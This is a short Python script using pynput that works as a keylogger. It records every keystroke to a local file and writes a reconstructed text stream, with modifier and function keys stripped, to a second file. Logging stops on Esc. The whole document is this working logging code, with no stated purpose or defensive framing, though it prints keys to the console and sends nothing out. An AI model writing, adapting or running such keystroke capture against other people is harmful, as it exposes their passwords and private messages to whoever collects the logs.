from pynput import keyboard


Allkeylogsfile=open("AllLoggedKeys.txt",'a')
keyWordslogs=open("LoggedKeyWords.txt",'a')

keys=[]
word_Keys=[]

#these will be excluded ONLY from loggedKeyWord.txt but will be available in AllLoggedkeys.txt
Excluded_Keys = {
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4, 
    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, 
    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12,
    keyboard.Key.print_screen,
    keyboard.Key.scroll_lock,
    keyboard.Key.pause,
    keyboard.Key.insert,
    keyboard.Key.home,
    keyboard.Key.page_up,
    keyboard.Key.page_down,
    keyboard.Key.end,
    keyboard.Key.delete,
    keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
    keyboard.Key.media_volume_up,
    keyboard.Key.media_volume_down,
    keyboard.Key.media_play_pause,
    keyboard.Key.esc
}


def pressed(key):

    global keys  
    global word_Keys
    try:
        print('{0} pressed'.format(key.char))
        keys.append(key.char)
        word_Keys.append(key.char)

    except AttributeError:
        if key == keyboard.Key.space:
                print('Space key pressed')
                keys.append(f"<{key}>")
                word_Keys.append(" ")
        elif key == keyboard.Key.enter:
                print('Enter key pressed')
                keys.append(f"<{key}>")
                word_Keys.append("\n")
        else:
                print(f'Special key {key} pressed')
                keys.append(f"<{key}>")
                
                if(key in Excluded_Keys):
                    return
                elif(key==keyboard.Key.backspace):
                    word_Keys.pop()
                else:    
                 word_Keys.append(f"<{key}>")



def released(key):
    print('{0} released'.format( key))
    if key == keyboard.Key.esc:
        write_File(keys)
        write_File(word_Keys)
        
        return False
    
  
def write_File(key):
    for key in keys:
        Allkeylogsfile.write(str(key))
        Allkeylogsfile.write("\n")
    keys.clear()    
    
    for key in word_Keys :
        keyWordslogs.write(str(key))
    word_Keys.clear()    

with keyboard.Listener( on_press=pressed, on_release=released) as listener:
    listener.join()
